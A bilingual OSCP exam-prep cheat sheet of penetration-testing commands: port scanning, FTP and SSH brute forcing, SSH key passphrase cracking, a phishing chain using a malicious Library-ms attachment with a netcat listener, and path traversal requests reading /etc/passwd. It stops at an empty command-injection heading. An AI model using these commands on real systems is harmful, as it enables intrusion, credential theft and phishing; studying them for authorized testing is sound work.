OSCP NOTE/Cheat Sheet/SCRIPTS

OSCP Note from my PEN200 labs and OSCP A-B-C practice test / OSCP note từ khóa học PEN200 và bài kiểm tra thử OSCP A-B-C

Sử dụng note và cheatsheet tốt nhất là tự viết.

ENUMERATION METHOD:

Personal opinion: autorecon+nmap rarely missed an initial access in OSCP lab and exam, and if it missed, likely it is a hidden API endpoint and hidden directories /  autorecon kết hợp với nmap hiếm khi bỏ sót việc truy cập ban đầu trong môi trường OSCP lab và bài thi, và nếu nó bỏ sót, có khả năng đó là các API endpoint ẩn và các thư mục ẩn.

Network Initial Scan:

NMAP:

```nmap -p <ports> -sV -sC -A $IP```

```nmap -sS -p- --min-rate=1000 $IP -Pn``` #stealth scans

```nmap -p- --min-rate 1000 $IP -Pn```
#disables the ping command and only scans ports, sometimes ping scan is not reliable way to determine if the machine is online / Vô hiệu hóa lệnh ping và chỉ quét cổng, đôi khi quét ping không phải là cách đáng tin cậy để xác định xem máy đang hoạt động hay không.

``sudo nmap -F -sU -sV $IP`` #UDP Scan

AUTORECON:

```sudo autorecon $IP --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv```

```sudo autorecon $IP```

PORT ENUMERATION:

FTP (port 21):

```ftp -A $IP #Active mode```

```ftp $IP```

```anonymous:anonymous``` #anonymous login

```put test.txt``` #check if it is reflected in a http port

```put winpeas.exe``` # test binary upload

```hydra -l usernames.txt -P /usr/share/wordlists/rockyou.txt $IP -t 4 ftp``` #brute force FTP

```wget -r ftp://anonymous:anonymous@1IP/``` #download file recursively (anonymous logged) / tải tất cả các files trong folder share

```wget -r ftp://username:password@IP/``` 

```find / -name Settings.*  2>/dev/null``` #looking through the files / tìm tên file

Extra:

Looking for hidden information in files in share folder /  trích xuất thông tin có trong files document:

EXIFTOOL:

```exiftool *``` #extract information in all files / tìm kiếm thông tin trong tất cả các file có trong folder

```exiftool -a -u filename.pdf```

SSH (port 22):

Private key obtained

```chmod 600 id_rsa```

```ssh user@IP -i id_rsa```

Public key obtained

```cat id_rsa.pub``` 

```ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= john@oscp``` #new user found

Brute force:

```hydra -L users.txt -p passwords.txt $IP -t 4 ssh``` 

Cracking private passphrase - NOTE: the key could be in id_rsa format (enumerate the nmap ssh scan to determine the key format)
/etc/ssh/*pub #Use this to view the type of key you have aka (ecdsa) / khóa ssh có thể ở dạng id_rsa hoặc id_ecdsa, chúng ta dựa vào nmap scan để định dạng

```ssh2john id_ecdsa > id_ecdsa.hash``` #this instance the private key is ecdsa format 

```cat id_ecdsa.hash``` 

```john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash```

Finding Private keys/PUblick key / tìm thấy ssh keys

```cat /etc/ssh/*pub``` #Use this to view the type of key you have aka (ecdsa) / in file ra để tìm định dạng của ssh key

```ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01``` #example

```/home/anita/.ssh/id_ecdsa.pub``` #public key / tìm thấy key public

```/home/anita/.ssh/id_ecdsa``` #private key / tìm thấy private key

TELNET (port 23)

enumerate telnet:

```nmap -n -sV -Pn --script "*telnet*" -p 23 {IP}```

log in telnet:

```telnet -l user $IP```

SMTP, POP3, Telnet (port 25, port 110, port 23 )

Enum and login

```nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP```

```telnet $IP 110 #Connect to pop3```

With these ports open and credentials, the initial access to the machine might be phishing:

Create malicious file:

config.Library-ms and install.LNK file: change the IP address and the download link.

Running webdav folder

```sudo wsgidav  --host=0.0.0.0 --port=80 --auth=anonymous --root webdav```

Send phishing mail:

```sudo swaks -t username@domain.com --from maildmz@domain.com --attach @config.Library-ms --server $IP --body @body. txt --header "Subject: Staging Script" --suppress-data -ap```

wait for nc -lnvp 4444

WEB SERVER (port 80, 8000, 8080, etc)

Brute Force access:

```ffuf -c -w /usr/share/wordlists/dirb/small.txt -u https://ffuf.io.fi/FUZZ```

```ffuf -c -w /path/to/wordlist -u https://ffuf.io.fi/FUZZ -recursion -recursion-depth 2```

GET parameter fuzzing

```ffuf -c -w /path/to/wordlist -u https://ffuf.io.fi?FUZZ=test_value```

POST data fuzzing

```ffuf -c -w /path/to/wordlist -X POST -d "username=admin&password=FUZZ" -u https://ffuf.io.fi/login.php```


Fire traversal:

Apaache 2.4.49 vulnerability: cgi-bin directory in the URL 

Encode: 

```curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passw```

```curl --path-as-is http://192.168.181.16:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F../opt/install.txt```

For Linux we should check /etc/passwd and shh files.

Let's briefly examine directory traversal attacks on Windows. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities. In general, it is more difficult to leverage a directory traversal vulnerability for system access on Windows than Linux.

To identify files containing sensitive information, we need to closely examine the web application and collect information about the web server, framework, and programming language.

Once we gather information about the running application or service, we can research paths leading to sensitive files. if we learn that a target system is running the Internet Information Services (IIS)5 web server, logs are located at C:\inetpub\logs\LogFiles\W3SVC1\. Another file we should always

Check when the target is running an IIS web server is C:\inetpub\wwwroot\web.config, which may contain sensitive information like passwords or usernames.


OS Command Injection:






